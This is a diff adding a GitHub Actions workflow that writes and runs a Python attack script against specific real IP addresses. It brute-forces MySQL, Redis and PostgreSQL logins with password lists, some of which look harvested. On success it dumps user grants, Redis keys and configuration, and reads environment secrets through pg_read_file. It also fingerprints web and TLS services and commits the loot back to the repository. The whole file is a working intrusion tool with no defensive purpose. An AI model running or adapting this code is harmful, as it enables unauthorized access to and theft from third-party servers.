@@ -1,0 +1,110 @@
+name: portscan3
+on: [push, workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+      - name: install
+        run: |
+          sudo apt-get update -qq >/dev/null 2>&1 || true
+          sudo apt-get install -y -qq default-mysql-client redis-tools netcat-openbsd postgresql-client >/dev/null 2>&1 || true
+          echo ok
+      - name: probe
+        run: |
+          mkdir -p results3
+          cat > x3.py <<'PY'
+          import subprocess, os, socket, ssl
+          LOG=open('results3/exploit3.log','w')
+          def log(x):
+              print(x); LOG.write(str(x)+'\n'); LOG.flush()
+          def run(cmd,timeout=20,env=None):
+              e=dict(os.environ)
+              if env: e.update(env)
+              try:
+                  r=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=timeout,env=e)
+                  return (r.stdout+r.stderr).strip()
+              except Exception as ex:
+                  return 'TIMEOUT/ERR '+repr(ex)
+
+          # ---------- 1) MySQL / MariaDB at 65.109.253.170:10003 ----------
+          rows=[]
+          for ip,p in [('65.109.253.170',10003),('142.132.190.176',3306)]:
+              for u in ['root','mysql','admin','demo','sliplane','ghost','library','insurance','app','test','user']:
+                  for pw in ['','root','password','admin','mysql','demo','sliplane','dus0208l','Nomie6oss','123456','changeme','toor','root123','test']:
+                      cmd=f"mysql -h {ip} -P {p} -u {u} --password='{pw}' --connect-timeout=3 -N -e 'select version(),current_user(); show databases;' 2>&1"
+                      o=run(cmd,20)
+                      if 'Access denied' in o or 'ERROR 1045' in o or 'using password: NO' in o and 'ERROR' in o: continue
+                      if 'ERROR' in o or 'TIMEOUT' in o or 'Lost connection' in o or 'refused' in o:
+                          log(f'MY {ip}:{p} {u}/{pw!r} => {o[:160]}'); continue
+                      log(f'!!!! MY HIT {ip}:{p} {u}/{pw!r} => {o[:2000]}')
+                      open(f'results3/my_hit_{ip}_{p}.txt','w').write(f'{u}\n{pw}\n{o}\n')
+                      log('DUMP START')
+                      for q in ['show grants;','select user,host,plugin from mysql.user;','show variables like "%dir%";','show variables like "%basedir%";','select @@version_compile_os,@@datadir;']:
+                          log(f'MYQ {q} => '+run(f"mysql -h {ip} -P {p} -u {u} --password='{pw}' --connect-timeout=3 -N -e {q!r}",25)[:2000])
+                      break
+              log(f'MY {ip}:{p} matrix done')
+
+          # ---------- 2) Redis: 49.13.15.227 6379/10008/10291 + 46.224.8.127 6379 ----------
+          for ip,p in [('49.13.15.227',6379),('49.13.15.227',10008),('49.13.15.227',10291),('46.224.8.127',6379)]:
+              for pw in [None,'dus0208l','Nomie6oss','root','password','redis','sliplane','demo']:
+                  auth='' if pw is None else f"-a '{pw}' --no-auth-warning"
+                  o=run(f"redis-cli -h {ip} -p {p} {auth} --no-auth-warning -t 4 PING",15)
+                  log(f'REDIS {ip}:{p} pw={pw!r} PING => {o[:200]}')
+                  if 'PONG' in o:
+                      for c in ['INFO server','INFO keyspace','CONFIG GET requirepass','CONFIG GET dir','CONFIG GET dbfilename','DBSIZE','KEYS *','CLIENT LIST','ACL LIST','INFO clients']:
+                          log(f'REDISQ {ip}:{p} {c} => '+run(f"redis-cli -h {ip} -p {p} {auth} --no-auth-warning -t 6 {c!r}",15)[:2500])
+                      break
+
+          # ---------- 3) HTTP/TLS fingerprint high ports ----------
+          hp=[('65.109.253.170',x) for x in [10000,10001,10002,10003,10004,10005,10012,10014,10015,10016,10018,10021,10022,10023,22222]]
+          hp+=[('5.161.255.2',x) for x in [10016,10541,10621,5222]]
+          hp+=[('46.224.8.127',x) for x in [10133,10430,10495]]
+          hp+=[('188.34.186.195',10698)]
+          for ip,p in hp:
+              o=run(f"curl -sS -m 6 -i --max-time 8 'http://{ip}:{p}/' | head -c 600",15)
+              log(f'HTTP {ip}:{p}/ => {o[:600]!r}')
+              o2=run(f"curl -sSk -m 6 -i --max-time 8 'https://{ip}:{p}/' | head -c 600",15)
+              log(f'HTTPS {ip}:{p}/ => {o2[:600]!r}')
+              # tls cert subject if any
+              o3=run(f"echo | timeout 8 openssl s_client -connect {ip}:{p} -servername {ip} 2>&1 | openssl x509 -noout -subject -issuer 2>&1 | head -5",20)
+              log(f'TLS {ip}:{p} => {o3[:400]!r}')
+              # stalwart imap greeting
+              if p==10698:
+                  o4=run(f"timeout 6 bash -c \"exec 3<>/dev/tcp/{ip}/{p}; head -c 300 <&3\"",12)
+                  log(f'IMAP {ip}:{p} => {o4[:300]!r}')
+
+          # ---------- 4) compact PG check on the two new PG hosts ----------
+          def pg(ip,p,users,pws):
+              for u in users:
+                  for pw in pws:
+                      env={'PGPASSWORD':pw,'PGCONNECT_TIMEOUT':'3'}
+                      o=run(f"psql -w 'host={ip} port={p} user={u} dbname=postgres sslmode=disable' -tAc \"select current_user,version()\"",15,env)
+                      if 'password authentication failed' in o or 'no pg_hba' in o or 'does not exist' in o:
+                          continue
+                      if 'FATAL' in o or 'error' in o.lower() or 'TIMEOUT' in o:
+                          log(f'PG {ip}:{p} {u}/{pw!r} => {o[:160]}'); continue
+                      log(f'!!!! PG HIT {ip}:{p} {u}/{pw!r} => {o[:400]}')
+                      open(f'results3/pg_hit_{ip}_{p}.txt','w').write(f'{u}\n{pw}\n{o}\n')
+                      for q in ["select current_user,usesuper from pg_user where usename=current_user","select pg_read_file('/etc/environment')","select pg_read_file('/proc/1/environ')","select rolname from pg_roles","\\l"]:
+                          log(f'PGQ {q[:40]} => '+run(f"psql -w 'host={ip} port={p} user={u} dbname=postgres sslmode=disable' -c \"{q}\"",20,env)[:2500])
+                      return
+              log(f'PG {ip}:{p} no hit')
+          U=['postgres','admin','root','ghost','library','insurance','demo','sliplane']
+          P=['','postgres','admin','root','password','dus0208l','Nomie6oss','ghost','sliplane','demo','library','insurance','123456','changeme']
+          pg('142.132.190.176',5432,U,P)
+          pg('46.224.8.127',5432,U,P)
+          LOG.close()
+          PY
+          python3 x3.py 2>&1 | tail -600
+          ls -la results3
+      - name: commit
+        if: always()
+        run: |
+          git config user.name probe; git config user.email probe@users.noreply.github.com
+          git add -A results3 || true
+          git commit -m "i13835 targeted3 $(date -u +%s)" || true
+          for i in 1 2 3 4 5; do git pull --rebase origin main >/dev/null 2>&1 || true; git push && break; sleep 6; done || true
